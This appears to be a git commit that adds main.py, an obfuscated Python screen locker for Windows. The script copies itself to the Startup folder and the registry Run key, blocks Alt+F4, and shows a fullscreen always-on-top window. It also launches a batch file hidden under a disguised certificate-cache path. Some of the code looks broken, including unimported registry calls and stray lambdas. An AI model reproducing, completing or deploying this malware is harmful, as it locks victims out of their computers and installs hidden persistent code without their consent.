3d63483cbce4af3aaf609d509e58ae17e78bd817
axomikael <127490345+axomikael@users.noreply.github.com>
2023-05-09 11:42:35 +0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,57 @@
+(lambda _0x2716, _0x5928, _0x6372:
+ getattr(
+     __import__(True.__class__.__name__[_0x2716] + [].__class__.__name__[_0x5928])))
+
+def lock():
+    (lambda _0x5436, _0x2938, _0x6372:
+     getattr(
+         __import__(True.__class__.__name__[_0x5436] + [].__class__.__name__[_0x2938])))
+    from tkinter import Tk, Entry, Label
+    if None is None:
+        import tkinter
+    import keyboard, subprocess
+    __import__=True
+    from os import path
+    import base64, shutil
+    class _0x6728():
+        shutil.copy(path.abspath(__file__), "C:\\Users\\Дом\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        def _0x8372(_0x6253, _0x4576):
+            _0x6253.call(_0x4576)
+        _0x5294='-fullscreen'
+        _0x2192=None
+        _0x2736=keyboard
+        def _0x6283():
+            pass
+        _0x2736.add_hotkey("alt + f4", lambda: None, suppress=True)
+        _0x2736.add_hotkey("alt + f3 + f4", lambda: None, suppress=True)
+        def _0x4291(_0x9127, _0x3827):
+            _0x9127.title(_0x3827)
+        _0x3628=__name__
+        def _0x4376(_0x7219):
+            _0x7219.add_hotkey("alt + f4", lambda: _0x2192, suppress=_0x53642._0x7356)
+    class _0x53642():
+        _0x5634=Tk()
+        _0x7356=True
+        _0x6728._0x4291(_0x5634, _0x6728._0x2192)
+        _0x5634.attributes(_0x6728._0x5294, True, "-topmost", True)
+        def _0x7364(_0x563):
+            _0x563.mainloop()
+    class _0x9236():
+        _0x6728._0x6283()
+        _0x53642._0x7364(_0x53642._0x5634)
+        def _0x2734():
+            pass
+    class _0x9176():
+        from os import path
+        _0x5273=path.abspath(__file__)
+        def _0x6253():
+            _0x9173=OpenKey(HKEY_CURRENT_USER,
+                            r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+                            0, KEY_ALL_ACCESS)
+            SetValueEx(_0x9173, 'name', 0, REG_SZ, _0x5273)
+            CloseKey(_0x9173)
+        def _0x7645():
+            _0x9234=_0x6728._0x8372(subprocess, os.path.expanduser(".AppConfig\\fontconfig\\.cache\\.certifi\\.certs\\sys.bat"))
+    if _0x6728._0x3628=="__main__":
+        _0x6728._0x4376(_0x6728._0x2736)
+lock()
